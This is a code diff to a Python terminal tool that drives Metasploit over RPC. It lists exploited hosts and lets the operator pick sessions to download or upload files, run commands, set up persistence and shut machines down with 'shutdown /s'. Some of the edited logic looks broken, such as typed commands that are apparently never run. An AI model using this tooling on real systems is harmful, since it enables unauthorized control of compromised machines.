@@ -12,13 +12,14 @@ from src import exploit
 warnings.filterwarnings("ignore", category=FutureWarning)
 
 
-def build_table(client, exploited_hosts, hosts, vulns, sessions):
+def build_table(client, hosts, vulns, sessions):
 
     # get all hosts
 
     # printd(sessions)
     # get all hosts from hosts.csv
     # clear_terminal()
+    exploited_hosts = pandas.DataFrame(columns=['Session ID', 'IP', 'OS', "shell", 'Exploit', 'Status'])
     hosts_real = pandas.read_csv(os.path.join(cwd, '../hosts.csv'), index_col=0, header=0)
     # printd(hosts_real.index.tolist())
     # remove hosts that are not in hosts.csv
@@ -33,7 +34,6 @@ def build_table(client, exploited_hosts, hosts, vulns, sessions):
     #     if session['tunnel_peer'] not in hosts_real.index.tolist():
     #         client.sessions.session(str(sid)).stop()
     sessions = client.sessions.list
-    print(sessions)
     # for sid, session in sessions.items():
     #     exploited_hosts = exploited_hosts.append({
     #         'IP': session['session_host'],
@@ -43,11 +43,10 @@ def build_table(client, exploited_hosts, hosts, vulns, sessions):
     #                                                 'Exploit': session['via_exploit'],
     #                                                 'Status': 'Active' if session['tunnel_peer']  in hosts_real.index.tolist() else "Closed"},
     #                                                 ignore_index=True)
-
     if sessions:
         for sid, session in sessions.items():
-            # printd(session)
-            if sid not in exploited_hosts['Session ID'].tolist():
+            sid = str(sid)
+            if sid not in exploited_hosts.index.tolist():
                 exploited_hosts = exploited_hosts.append({
                     'IP': session['session_host'],
                     'Session ID': sid,
@@ -57,8 +56,9 @@ def build_table(client, exploited_hosts, hosts, vulns, sessions):
                     'Status': 'Active' if session['tunnel_peer'] in hosts_real.index.tolist() else "Closed"},
                     ignore_index=True)
             else:
-                exploited_hosts.loc[exploited_hosts['Session ID'] == sid, 'Status'] = 'Active' if session['tunnel_peer'] in hosts_real.index.tolist() else "Offline"
+                exploited_hosts.loc[exploited_hosts['Session ID'] == str(sid), 'Status'] = 'Active' if session['tunnel_peer'] in hosts_real.index.tolist() else "Offline"
     # match hosts from hosts with sessions
+    print()
     for host in hosts:
         if host['address'] in exploited_hosts['IP'].tolist():
             exploited_hosts.loc[exploited_hosts['IP'] == host['address'], 'OS'] = host['address']
@@ -94,7 +94,8 @@ def build_table(client, exploited_hosts, hosts, vulns, sessions):
         # set session id as index
     # if session id is in the exploited_hosts dataframe, set it as the index
     if sessions:
-        exploited_hosts = exploited_hosts.set_index('Session ID')
+        if exploited_hosts.index.name != "Session ID":
+            exploited_hosts = exploited_hosts.set_index('Session ID')
     else:
         exploited_hosts = exploited_hosts.set_index('IP')
 
@@ -102,10 +103,10 @@ def build_table(client, exploited_hosts, hosts, vulns, sessions):
     # pretty printd table
     return exploited_hosts
 
-def start_page(client, exploited_hosts, hosts, vulns, sessions):
+def start_page(client, hosts, vulns, sessions):
     clear_terminal()
     printd(create_header("INTERACT WITH EXPLOITED HOSTS"))
-    printd(build_table(client, exploited_hosts, hosts, vulns, sessions))
+    printd(build_table(client, hosts, vulns, sessions))
 
 def main(client: MsfRpcClient):
     """
@@ -123,14 +124,14 @@ def main(client: MsfRpcClient):
     :return:
     """
     # get all hosts
-    exploited_hosts = pandas.DataFrame(columns=['Session ID', 'IP', 'OS', "shell", 'Exploit', 'Status'])
+
 
     hosts = client.db.workspaces.workspace('default').hosts.list
     vulns = client.db.workspaces.workspace('default').vulns.list
     sessions = client.sessions.list
     clear_terminal()
     printd(create_header("INTERACT WITH EXPLOITED HOSTS"))
-    printd(build_table(client, exploited_hosts, hosts, vulns, sessions))
+    printd(build_table(client, hosts, vulns, sessions))
 
 
     go_back = False
@@ -138,36 +139,38 @@ def main(client: MsfRpcClient):
         try:
             clear_terminal()
             printd("1. ALL EXPLOITED HOSTS", header=True)
-            printd(build_table(client, exploited_hosts, hosts, vulns, sessions))
+            printd(build_table(client, hosts, vulns, sessions))
             # show options if session id is the index of the dataframe
-            if exploited_hosts.index.name == 'Session ID':
+            if sessions:
                 printd('1. Select host')
             printd('2. Go back')
             choice = input('Enter your choice: ')
 
-            if choice == '1' and exploited_hosts.index.name == 'Session ID':
+            if choice == '1' and sessions:
                 while not go_back:
                     clear_terminal()
                     printd("2. SESSIONS", header=True)
-                    printd(build_table(client, exploited_hosts, hosts, vulns, sessions))
-                    printd(exploited_hosts.index.tolist())
+                    printd(build_table(client, hosts, vulns, sessions))
                     sids = []
                     sid = input('Enter session id (or multiple separated by spaces: ')
                     for s in sid.split(' '):
-                        if s in exploited_hosts.index.tolist():
+                        if s in sessions.keys():
                             sids.append(s)
-                    if sid in exploited_hosts.index.tolist():
+                    if sid in sessions.keys():
                         s = client.sessions.session(sid)
                         session_type = sessions[sid]['type']
                         while not go_back:
                             clear_terminal()
+                            print(s.info)
+
                             printd(f"REMOTE {session_type} shell running on {sessions[sid]['session_host']}",header=True)
-                            printd(build_table(client, exploited_hosts, hosts, vulns, sessions))
+                            printd(build_table(client,hosts, vulns, sessions))
                             printd('1. Download File')
                             printd('2. Upload File')
                             printd('3. Run Command')
                             printd('4. Shut Down')
-                            printd('5. Go Back')
+                            printd('5. Delete Session')
+                            printd('6. Go Back')
                             choice = input('Enter your choice: ')
                             if choice in ['1', '2', '3']:
                                 # run command, download file, upload file
@@ -196,46 +199,55 @@ def main(client: MsfRpcClient):
                                             go_back = True
                                             break
                                         else:
-                                            s.run_with_output(command)
-                                            time.sleep(1)
-                                            out = ''
-                                            while len(out) == 0:
+                                            try:
+                                                out = s.get_writeable_dir()
                                                 time.sleep(1)
-                                                out = s.read()
+                                                print(out)
+                                                out = ''
+                                                while len(out) == 0:
+                                                    time.sleep(1)
+                                                    out = s.read()
+                                            except Exception as e:
+                                                print(e)
+                                                go_back = True
+                                                break
 
                                 go_back = False
                             elif choice == '4':
                                 # shut down
-                                exploit.persist(client, sid)
-                                s.run_with_output('shutdown /s')
+                                exploit.persist(client, sids)
+                                s.run_psh_cmd('shutdown /s', timeout=10, )
                                 time.sleep(1)
                                 out = ''
-                                while len(out) == 0:
-                                    time.sleep(1)
-                                    out = s.read()
-                                exploited_hosts.loc[sid, 'Status'] = 'Offline'
+                                # while len(out) == 0:
+                                #     time.sleep(1)
+                                #     out = s.read()
                                 # printd(build_table(client, exploited_hosts, hosts, vulns, sessions))
                                 break
                             elif choice == '5':
+                                # delete session
+                                s.stop()
+                                break
+                            elif choice == '6':
                                 # go back
                                 break
                             elif choice.lower() == 'exit':
-                                return build_table(client, exploited_hosts, hosts, vulns, sessions)
+                                return build_table(client, hosts, vulns, sessions)
                             else:
                                 printd('Invalid choice')
                                 break
                     elif choice.lower() == 'exit':
-                        return build_table(client, exploited_hosts, hosts, vulns, sessions)
+                        return build_table(client, hosts, vulns, sessions)
                     else:
                         break
             elif choice == '2':
                 go_back = True
             elif choice.lower() == 'exit':
-                return build_table(client, exploited_hosts, hosts, vulns, sessions)
+                return build_table(client, hosts, vulns, sessions)
             else:
                 printd('Invalid choice')
 
         except Exception as e:
             return f"Error ({type(e)}): {e}"
         else:
-            return build_table(client, exploited_hosts, hosts, vulns, sessions)
+            return build_table(client, hosts, vulns, sessions)
